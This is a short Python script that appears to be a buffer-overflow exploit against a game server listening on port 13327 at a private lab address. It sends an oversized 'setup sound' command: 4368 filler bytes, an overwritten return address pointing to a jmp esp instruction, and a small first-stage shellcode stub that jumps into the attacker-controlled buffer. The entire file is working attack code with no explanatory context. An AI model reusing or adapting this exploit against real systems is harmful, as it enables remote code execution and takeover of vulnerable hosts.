#!/usr/bin/python
import socket

host = "192.168.193.44"

offset      = "\x41" * 4368
eip         = "\x96\x45\x13\x08" # 08134596 (jmp esp)
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # Fills 7 bytes - jumps to EAX+12, and 2 NOPS
buffer      = "\x11(setup sound " + offset + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*] Payload sent!")
